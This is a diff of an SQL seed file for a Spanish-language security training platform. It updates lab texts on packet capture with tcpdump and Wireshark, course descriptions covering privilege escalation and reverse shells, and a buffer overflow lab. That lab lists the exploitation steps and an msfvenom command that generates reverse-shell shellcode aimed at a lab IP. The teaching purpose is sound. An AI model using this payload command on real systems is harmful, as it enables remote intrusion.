@@ -30,7 +30,7 @@ ON CONFLICT (slug) DO UPDATE SET
 INSERT INTO course_modules (course_id, slug, title, description, position)
 SELECT c.id, 'criptografia-aplicada',
   'Criptografía Aplicada',
-  'Hashing, cifrado simétrico y asimétrico con herramientas reales de línea de comandos.',
+  'Hashing y cifrado simétrico con herramientas reales de línea de comandos.',
   1
 FROM courses c WHERE c.slug = 'redes-criptografia'
 ON CONFLICT (course_id, slug) DO UPDATE SET
@@ -381,7 +381,7 @@ INSERT INTO laboratories (module_id, slug, title, content_markdown, position, es
 SELECT cm.id,
   'wireshark-tcpdump',
   'Captura de Paquetes con Wireshark y tcpdump',
-  E'## ¿Por qué capturar tráfico?\n\nLa captura de paquetes permite a un analista de seguridad:\n- Detectar comunicaciones no cifradas con datos sensibles.\n- Identificar malware que se comunica con servidores C2.\n- Depurar problemas de red.\n- Analizar protocolos desconocidos.\n\n## tcpdump — captura en terminal\n\n**tcpdump** es la herramienta de captura de paquetes de línea de comandos más universal.\n\n```bash\n# Capturar en interfaz eth0 y guardar en archivo\ntcpdump -i eth0 -w captura.pcap\n\n# Filtrar solo tráfico HTTP\ntcpdump -i eth0 port 80\n\n# Ver paquetes en tiempo real con contenido ASCII\ntcpdump -i eth0 -A port 80\n```\n\n## Wireshark — análisis visual\n\nWireshark abre los archivos `.pcap` y permite filtrarlos con su propio lenguaje:\n\n| Filtro Wireshark | Descripción |\n|------------------|-------------|\n| `http` | Solo tráfico HTTP |\n| `dns` | Solo consultas DNS |\n| `tcp.port == 443` | Solo HTTPS |\n| `ip.addr == 10.10.10.1` | Solo tráfico hacia/desde esa IP |\n| `http.request.method == POST` | Solo peticiones POST |\n\n## Modo promiscuo\n\nEn modo normal, la tarjeta de red solo acepta paquetes destinados a su MAC. En **modo promiscuo**, acepta todo el tráfico del segmento de red, lo que permite capturar tráfico de otras máquinas.\n\n---\nCompleta el quiz y la actividad para ganar **200 puntos**.',
+  E'## ¿Por qué capturar tráfico?\n\nLa captura de paquetes permite a un analista de seguridad:\n- Detectar comunicaciones no cifradas con datos sensibles.\n- Identificar malware que se comunica con servidores C2.\n- Depurar problemas de red.\n- Analizar protocolos desconocidos.\n\n## ¿Qué ve exactamente un paquete capturado?\n\nCada paquete es como una carta metida dentro de varios sobres, uno dentro de otro, siguiendo las capas del modelo OSI. Wireshark literalmente abre sobre por sobre:\n\n- **Capa 2 (Enlace):** el sobre más externo, con la dirección MAC de origen y destino — como el nombre del cartero que la entrega en tu cuadra.\n- **Capa 3 (Red):** un segundo sobre adentro, con las direcciones IP — el código postal completo.\n- **Capa 4 (Transporte):** el número de puerto — el apartamento exacto dentro del edificio.\n- **Capa 7 (Aplicación):** la carta misma — el HTTP, DNS o lo que sea que la aplicación realmente dijo.\n\nPor eso Wireshark **captura desde la capa 2** (necesita leer el sobre externo para saber de dónde viene el paquete) y **analiza hasta la capa 7** (puede abrir todos los sobres internos y mostrarte el contenido real, si no está cifrado).\n\n## tcpdump — captura en terminal\n\n**tcpdump** es la herramienta de captura de paquetes de línea de comandos más universal.\n\n```bash\n# Capturar en interfaz eth0 y guardar en archivo\ntcpdump -i eth0 -w captura.pcap\n\n# Filtrar solo tráfico HTTP\ntcpdump -i eth0 port 80\n\n# Ver paquetes en tiempo real con contenido ASCII\ntcpdump -i eth0 -A port 80\n```\n\n## Wireshark — análisis visual\n\nWireshark abre los archivos `.pcap` y permite filtrarlos con su propio lenguaje:\n\n| Filtro Wireshark | Descripción |\n|------------------|-------------|\n| `http` | Solo tráfico HTTP |\n| `dns` | Solo consultas DNS |\n| `tcp.port == 443` | Solo HTTPS |\n| `ip.addr == 10.10.10.1` | Solo tráfico hacia/desde esa IP |\n| `http.request.method == POST` | Solo peticiones POST |\n\n## Modo promiscuo\n\nEn modo normal, la tarjeta de red solo acepta paquetes destinados a su MAC. En **modo promiscuo**, acepta todo el tráfico del segmento de red, lo que permite capturar tráfico de otras máquinas.\n\n---\nCompleta el quiz y la actividad para ganar **200 puntos**.',
   1, 30, 200, TRUE
 FROM course_modules cm WHERE cm.slug = 'analisis-trafico-red'
 ON CONFLICT (module_id, slug) DO UPDATE SET
@@ -415,7 +415,7 @@ ON CONFLICT (laboratory_id, question_order) DO NOTHING;
 INSERT INTO laboratory_questions (laboratory_id, question_order, question_type, question_text, explanation)
 SELECT l.id, 4, 'multiple_choice',
   '¿En qué capa del modelo OSI opera Wireshark principalmente?',
-  'Wireshark captura a nivel de capa 2 (Enlace) y puede analizar hasta capa 7 (Aplicación), diseccionando protocolo por protocolo la pila completa.'
+  'Wireshark captura a nivel de capa 2 (Enlace) y puede analizar hasta capa 7 (Aplicación) — abre cada "sobre" de la pila de protocolos hasta llegar al contenido real.'
 FROM laboratories l WHERE l.slug = 'wireshark-tcpdump'
 ON CONFLICT (laboratory_id, question_order) DO NOTHING;
 
@@ -711,7 +711,7 @@ INSERT INTO courses (slug, title, description, difficulty, is_published, created
 SELECT
   'pentesting-avanzado',
   'Pentesting Avanzado y Escalada de Privilegios',
-  'Técnicas avanzadas de post-explotación: escalada de privilegios en Linux, abuso de configuraciones sudo/SUID, explotación de cron jobs y fundamentos de buffer overflow.',
+  'Técnicas avanzadas de post-explotación: escalada de privilegios en Linux, abuso de configuraciones sudo/SUID, explotación de cron jobs, reverse shells y persistencia, y fundamentos de buffer overflow.',
   'avanzado',
   TRUE,
   id
@@ -1236,12 +1236,12 @@ JOIN laboratories l ON q.laboratory_id = l.id
 WHERE l.slug = 'reverse-shell-persistencia' AND q.question_order = 5
 ON CONFLICT (question_id) DO NOTHING;
 
--- ── Lab 8: Buffer Overflow — Conceptos Básicos ────────────────────────────────
+-- ── Lab 8: Buffer Overflow: Conceptos Básicos ────────────────────────────────
 
 INSERT INTO laboratories (module_id, slug, title, content_markdown, position, estimated_minutes, points, is_published)
 SELECT cm.id,
   'buffer-overflow-basico',
-  'Buffer Overflow — Conceptos Básicos',
+  'Buffer Overflow: Conceptos Básicos',
   E'## ¿Qué es un Buffer Overflow?\n\nUn **buffer overflow** (desbordamiento de búfer) ocurre cuando un programa escribe más datos en un búfer de los que puede contener, sobrescribiendo memoria adyacente en el stack. Si se controla qué se escribe en esa memoria, se puede redirigir la ejecución del programa.\n\n## El Stack y el registro EIP/RIP\n\n```\n┌──────────────────┐  ← dirección alta\n│   Parámetros     │\n├──────────────────┤\n│  Dirección ret.  │ ← EIP/RIP: apunta a la siguiente instrucción\n├──────────────────┤\n│   Saved EBP/RBP  │\n├──────────────────┤\n│                  │\n│    BUFFER        │ ← si se desborda, sobrescribe lo de arriba\n│                  │\n└──────────────────┘  ← dirección baja (ESP/RSP)\n```\n\n## Proceso de explotación (32 bits, sin protecciones)\n\n```\n1. Encontrar el offset hasta EIP  →  patrón cíclico + valor de EIP corrompido\n2. Controlar EIP                  →  enviar offset + dirección de retorno deseada\n3. Colocar shellcode              →  en el buffer o en el stack\n4. Apuntar EIP al shellcode       →  dirección en el stack o gadget JMP ESP\n```\n\n## Herramientas esenciales\n\n```bash\n# Generar patrón cíclico de 200 bytes (pwntools)\npython3 -c "from pwn import *; print(cyclic(200))"\n\n# Encontrar el offset con el valor de EIP corrompido\npython3 -c "from pwn import *; print(cyclic_find(0x61616161))"\n\n# Generar shellcode con msfvenom\nmsfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.2 LPORT=4444 -f python\n```\n\n## Protecciones modernas\n\n| Protección | Descripción |\n|------------|-------------|\n| **ASLR** | Aleatoriza las direcciones del stack, heap y librerías |\n| **Stack Canary** | Valor centinela entre buffer y EIP; si cambia, aborta |\n| **NX/DEP** | Marca el stack como no ejecutable |\n| **PIE** | El ejecutable mismo se carga en dirección aleatoria |\n\n---\nCompleta el quiz y la actividad para ganar **500 puntos**.',
   2, 60, 500, TRUE
 FROM course_modules cm WHERE cm.slug = 'post-explotacion'
